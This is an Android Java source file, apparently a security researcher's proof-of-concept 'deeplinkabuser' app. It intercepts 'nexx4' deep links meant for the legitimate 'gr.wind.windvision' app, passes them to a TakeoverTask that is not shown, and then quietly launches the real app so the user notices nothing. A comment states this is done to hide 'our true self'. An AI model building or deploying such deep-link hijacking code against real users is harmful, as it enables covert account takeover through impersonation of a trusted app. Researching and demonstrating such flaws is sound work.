package com.fsecure.deeplinkabuser;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.MediaDrm;
import android.media.UnsupportedSchemeException;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.UUID;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        NotificationUtils.createNotificationChannel(this);
    }


    @Override
    protected void onResume() {
        super.onResume();

        Uri uri = getIntent().getData();
        if (uri != null && uri.getScheme() != null && uri.getScheme().equals("nexx4")) {
            new TakeoverTask(this).execute(uri);
        }
        // else/finally: immediately exit to real app - hiding our true self, not raising any suspicions
        callRealApp(this);

    }


    public static void callRealApp(Context context) {
        Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage("gr.wind.windvision");
        if (launchIntent != null) {
            context.startActivity(launchIntent);//null pointer check in case package name was not found
        }

    }

}
